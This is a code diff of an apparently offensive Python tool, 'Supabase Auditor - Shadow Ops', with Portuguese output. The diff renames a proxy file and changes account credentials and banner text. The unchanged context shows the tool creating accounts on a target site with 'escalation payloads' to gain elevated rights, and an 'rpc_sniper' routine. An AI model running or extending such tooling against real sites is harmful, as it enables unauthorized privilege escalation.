@@ -183,9 +183,9 @@ class ShyyunzAuditor:
         self.current_proxy = None
 
     def load_proxies(self):
-        if os.path.exists("sh_proxies.txt"):
+        if os.path.exists("proxies.txt"):
             try:
-                with open("sh_proxies.txt", "r") as f: return [l.strip() for l in f if l.strip()]
+                with open("proxies.txt", "r") as f: return [l.strip() for l in f if l.strip()]
             except: pass
         return []
 
@@ -277,9 +277,9 @@ class ShyyunzAuditor:
         ]
         success = False
         for i, p in enumerate(payloads, 1):
-            email = f"shy.esc.{random.randint(1000,9999)}@shyyunz.sec"
+            email = f"admin{random.randint(1000,9999)}@shyyunz.sec"
             console.print(f"[dim]  [{i}/5] Testando payload: {json.dumps(p)}...[/dim]")
-            token = await self.create_account(email, "Shy_Esc_123", p)
+            token = await self.create_account(email, "Shyyunz2.0", p)
             if token:
                 console.print(f"[bold green][!!!] ESCALONAMENTO BEM-SUCEDIDO com payload: {json.dumps(p)}[/bold green]")
                 self.bearer = token
@@ -287,7 +287,7 @@ class ShyyunzAuditor:
                 success = True
                 break
         if not success:
-            console.print("[yellow][!] Nenhum payload de escalonamento funcionou neste alvo.[/yellow]")
+            console.print("[yellow][!] Nenhum escalonamento funcionou neste alvo.[/yellow]")
         return success
 
     async def rpc_sniper(self, brain: Optional[ShyyunzBrain] = None):
@@ -432,7 +432,7 @@ def prompt_payload():
 
 async def audit_routine():
     console.print(Align.center(BRANDED_BANNER))
-    console.print(Align.center(Panel.fit("[bold magenta]SUPABASE AUDITOR v8.0 - SHADOW OPS[/bold magenta]", border_style="cyan")))
+    console.print(Align.center(Panel.fit("[bold magenta]SUPABASE AUDITOR v2.0 - SHADOW OPS[/bold magenta]", border_style="cyan")))
     site_url = console.input("\n[bold cyan][🌐 SHY_SEC] URL:[/bold cyan] ").strip()
     
     # Sanitização: Remove caracteres de controle (como ^H/\x08) e conserta "https://https://"
